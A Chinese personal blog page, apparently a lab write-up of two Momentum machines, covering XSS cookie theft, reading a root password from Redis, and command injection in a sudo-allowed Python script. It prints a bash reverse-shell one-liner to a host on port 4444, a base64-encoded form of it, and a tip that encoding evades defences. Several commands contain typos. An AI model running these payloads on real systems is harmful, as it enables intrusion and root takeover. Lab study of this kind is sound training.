@@ -1,0 +1,199 @@
+<!DOCTYPE html><html lang="zh_CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>牛牛的blog | 牛牛的blog</title><meta name="author" content="牛牛"><meta name="copyright" content="牛牛"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="1.Momentum1.XSS平常很少见到XSS，一时没反应过来 这个页面会回显参数id的值，而且id是字符串类型  可以想到可能存在XSS漏洞，进行测试，成功  结合前面目录遍历得到main.js的内容，很有可能是对cookie进行AES加密了，密钥也给我们了  所以可以用XSS注入得到cookie  进行解密，得到登陆凭证 2.redis（6379）登录之后，用之前的方法都找不到利用的点，看w">
+<meta property="og:type" content="article">
+<meta property="og:title" content="牛牛的blog">
+<meta property="og:url" content="http://example.com/2023/03/17/%E9%9D%B6%E5%9C%BA/%E9%9B%B6%E6%95%A3%E7%9A%84%E9%9D%B6%E6%9C%BA/index.html">
+<meta property="og:site_name" content="牛牛的blog">
+<meta property="og:description" content="1.Momentum1.XSS平常很少见到XSS，一时没反应过来 这个页面会回显参数id的值，而且id是字符串类型  可以想到可能存在XSS漏洞，进行测试，成功  结合前面目录遍历得到main.js的内容，很有可能是对cookie进行AES加密了，密钥也给我们了  所以可以用XSS注入得到cookie  进行解密，得到登陆凭证 2.redis（6379）登录之后，用之前的方法都找不到利用的点，看w">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">
+<meta property="article:published_time" content="2023-03-16T18:00:08.791Z">
+<meta property="article:modified_time" content="2023-03-18T16:25:14.333Z">
+<meta property="article:author" content="牛牛">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2023/03/17/%E9%9D%B6%E5%9C%BA/%E9%9B%B6%E6%95%A3%E7%9A%84%E9%9D%B6%E6%9C%BA/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: 'days',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '牛牛的blog',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-03-19 00:25:14'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.2"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://files.catbox.moe/dbtw19.jpeg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">牛牛的blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">No title</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-03-16T18:00:08.791Z" title="Created 2023-03-17 02:00:08">2023-03-17</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-03-18T16:25:14.333Z" title="Updated 2023-03-19 00:25:14">2023-03-19</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="1-Momentum"><a href="#1-Momentum" class="headerlink" title="1.Momentum"></a>1.Momentum</h1><h3 id="1-XSS"><a href="#1-XSS" class="headerlink" title="1.XSS"></a>1.XSS</h3><p>平常很少见到XSS，一时没反应过来</p>
+<p>这个页面会回显参数id的值，而且id是字符串类型</p>
+<p><img src="/2023/03/17/%E9%9D%B6%E5%9C%BA/%E9%9B%B6%E6%95%A3%E7%9A%84%E9%9D%B6%E6%9C%BA/image-20230317122334281.png" alt="image-20230317122334281"></p>
+<p>可以想到可能存在XSS漏洞，进行测试，成功</p>
+<p><img src="/2023/03/17/%E9%9D%B6%E5%9C%BA/%E9%9B%B6%E6%95%A3%E7%9A%84%E9%9D%B6%E6%9C%BA/image-20230317122505202.png" alt="image-20230317122505202"></p>
+<p>结合前面目录遍历得到main.js的内容，很有可能是对cookie进行AES加密了，密钥也给我们了</p>
+<p><img src="/2023/03/17/%E9%9D%B6%E5%9C%BA/%E9%9B%B6%E6%95%A3%E7%9A%84%E9%9D%B6%E6%9C%BA/image-20230317122715020.png" alt="image-20230317122715020"></p>
+<p>所以可以用XSS注入得到cookie</p>
+<p><img src="/2023/03/17/%E9%9D%B6%E5%9C%BA/%E9%9B%B6%E6%95%A3%E7%9A%84%E9%9D%B6%E6%9C%BA/image-20230317122859201.png" alt="image-20230317122859201"></p>
+<p>进行解密，得到登陆凭证</p>
+<h3 id="2-redis（6379）"><a href="#2-redis（6379）" class="headerlink" title="2.redis（6379）"></a>2.redis（6379）</h3><p>登录之后，用之前的方法都找不到利用的点，看wp才懂要用到redis的知识，自己redis知识太薄弱了</p>
+<p>查看靶机监听的端口：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nn -nltup</span><br></pre></td></tr></table></figure>
+
+<p>看到了6379端口，它一般是redis服务的端口</p>
+<blockquote>
+<p>redis是一个key-value存储系统</p>
+</blockquote>
+<p>查看redis内容：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">redis-cli 是Redis命令行界面，一个简单的程序，允许直接从终端向Redis发送命令，并读取服务器发送的回复。</span></span><br><span class="line">redis-cli	  #开启</span><br><span class="line">key *    	  #枚举所有的key</span><br><span class="line">grt [keyname] #获得key值</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/03/17/%E9%9D%B6%E5%9C%BA/%E9%9B%B6%E6%95%A3%E7%9A%84%E9%9D%B6%E6%9C%BA/image-20230317124119844.png" alt="image-20230317124119844"></p>
+<p>得到root密码</p>
+<h1 id="1-Momentum2"><a href="#1-Momentum2" class="headerlink" title="1.Momentum2"></a>1.Momentum2</h1><h3 id="1-关于cmd提权操作"><a href="#1-关于cmd提权操作" class="headerlink" title="1.关于cmd提权操作"></a>1.关于cmd提权操作</h3><p>sudo -l发现可以对这两个文件使用无需密码的root操作</p>
+<p><img src="/2023/03/17/%E9%9D%B6%E5%9C%BA/%E9%9B%B6%E6%95%A3%E7%9A%84%E9%9D%B6%E6%9C%BA/image-20230319000409012.png" alt="image-20230319000409012"></p>
+<blockquote>
+<p>注意：不能单使用其中一个，我试过直接python提权，显示无权限</p>
+</blockquote>
+<p>看看cookie-gen.py的内容</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;~ Random Cookie Generation ~&#x27;</span>)</span><br><span class="line">print(<span class="string">&#x27;[!] for security reasons we keep logs about cookie seeds.&#x27;</span>)</span><br><span class="line">chars = <span class="string">&#x27;@#$ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefgh&#x27;</span></span><br><span class="line"></span><br><span class="line">seed = input(<span class="string">&quot;Enter the seed : &quot;</span>)</span><br><span class="line">random.seed = seed</span><br><span class="line"></span><br><span class="line">cookie = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">    cookie += random.choice(chars)</span><br><span class="line"></span><br><span class="line">print(cookie)</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;echo %s &gt;&gt; log.txt&quot;</span> % seed</span><br><span class="line">subprocess.Popen(cmd, shell=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>主要看最后两行，</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmd = <span class="string">&quot;echo %s &gt;&gt; log.txt&quot;</span> % seed <span class="comment">#%s的作用是进行字符串格式化，即echo [经过string化的seed] &gt;&gt; log.txt</span></span><br><span class="line">subprocess.Popen(cmd, shell=<span class="literal">True</span>) <span class="comment">#用shell权限执行cmd内容</span></span><br></pre></td></tr></table></figure>
+
+<p>重点来了，我们既然能自定义的seed内容，那能不能用这条代码进行提权呢？</p>
+<h4 id="echo执行系统命令"><a href="#echo执行系统命令" class="headerlink" title="echo执行系统命令"></a>echo执行系统命令</h4><p>首先我们进行正常的输出</p>
+<p><img src="/2023/03/17/%E9%9D%B6%E5%9C%BA/%E9%9B%B6%E6%95%A3%E7%9A%84%E9%9D%B6%E6%9C%BA/image-20230319001505486.png" alt="image-20230319001505486"></p>
+<p>但是在后面加一句 <strong>| bash</strong> ，就能执行系统命令</p>
+<p><img src="/2023/03/17/%E9%9D%B6%E5%9C%BA/%E9%9B%B6%E6%95%A3%E7%9A%84%E9%9D%B6%E6%9C%BA/image-20230319001625156.png" alt="image-20230319001625156"></p>
+<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>结合我们的shell反弹一句话</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.152.132/4444 0&gt;&amp;1&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>构成：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.152.132/4444 0&gt;&amp;1&#x27; | bash</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/03/17/%E9%9D%B6%E5%9C%BA/%E9%9B%B6%E6%95%A3%E7%9A%84%E9%9D%B6%E6%9C%BA/image-20230319001845411.png" alt="image-20230319001845411"></p>
+<p>同时监听4444端口，执行，直接到root权限</p>
+<p><img src="/2023/03/17/%E9%9D%B6%E5%9C%BA/%E9%9B%B6%E6%95%A3%E7%9A%84%E9%9D%B6%E6%9C%BA/image-20230319002022432.png" alt="image-20230319002022432"></p>
+<blockquote>
+<p>补充提醒：如果能将反弹shell一句话进行编码，再进行解码，可以更有效地绕过系统防护</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&#x27;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.152.132/4444 0&gt;&amp;1&#x27;&quot; | base64</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/03/17/%E9%9D%B6%E5%9C%BA/%E9%9B%B6%E6%95%A3%E7%9A%84%E9%9D%B6%E6%9C%BA/image-20230319002315408.png" alt="image-20230319002315408"></p>
+<p>seed等于：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;Jy9iaW4vYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE1Mi4xMzIvNDQ0NCAw</span><br><span class="line">PiYxJwo=&#x27; | base -d | bash</span><br></pre></td></tr></table></figure></blockquote>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="http://example.com">牛牛</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2023/03/17/%E9%9D%B6%E5%9C%BA/%E9%9B%B6%E6%95%A3%E7%9A%84%E9%9D%B6%E6%9C%BA/">http://example.com/2023/03/17/%E9%9D%B6%E5%9C%BA/%E9%9B%B6%E6%95%A3%E7%9A%84%E9%9D%B6%E6%9C%BA/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/03/21/%E7%AC%94%E8%AE%B0/DC9/"><img class="prev-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info"></div></div></a></div><div class="next-post pull-right"><a href="/2023/03/14/%E9%9D%B6%E5%9C%BA/corrosion2/"><img class="next-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">VulnHub——rorrosion2</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-Momentum"><span class="toc-number">1.</span> <span class="toc-text">1.Momentum</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-XSS"><span class="toc-number">1.0.1.</span> <span class="toc-text">1.XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-redis%EF%BC%886379%EF%BC%89"><span class="toc-number">1.0.2.</span> <span class="toc-text">2.redis（6379）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1-Momentum2"><span class="toc-number">2.</span> <span class="toc-text">1.Momentum2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%85%B3%E4%BA%8Ecmd%E6%8F%90%E6%9D%83%E6%93%8D%E4%BD%9C"><span class="toc-number">2.0.1.</span> <span class="toc-text">1.关于cmd提权操作</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#echo%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="toc-number">2.0.1.1.</span> <span class="toc-text">echo执行系统命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">2.0.1.2.</span> <span class="toc-text">提权</span></a></li></ol></li></ol></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By 牛牛</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
